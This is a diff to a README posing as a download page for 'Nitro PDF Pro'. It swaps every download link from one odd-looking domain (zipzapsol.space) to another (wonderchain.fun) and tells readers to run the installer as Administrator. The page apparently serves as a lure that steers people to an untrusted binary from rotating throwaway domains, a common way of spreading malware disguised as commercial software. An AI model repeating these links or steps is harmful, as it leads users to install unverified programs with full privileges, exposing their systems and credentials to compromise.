@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Nitro PDF Pro** for Windows.
 
 <p align="center">
-  <a href="https://nitro-pdf.zipzapsol.space/">
+  <a href="https://nitro-pdf.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Nitro%20PDF%20Pro-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Nitro PDF Pro">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[nitro-pdf.zipzapsol.space](https://nitro-pdf.zipzapsol.space/)** |
-| **Full URL** | `https://nitro-pdf.zipzapsol.space/` |
+| **Direct link** | **[nitro-pdf.wonderchain.fun](https://nitro-pdf.wonderchain.fun/)** |
+| **Full URL** | `https://nitro-pdf.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — nitro-pdf.zipzapsol.space](https://nitro-pdf.zipzapsol.space/)** (link above)
+1. Click **[Download — nitro-pdf.wonderchain.fun](https://nitro-pdf.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://nitro-pdf.zipzapsol.space/"><strong>⬇ Download Nitro PDF Pro now</strong></a></p>
+<p align="center"><a href="https://nitro-pdf.wonderchain.fun/"><strong>⬇ Download Nitro PDF Pro now</strong></a></p>
 
 ---
 
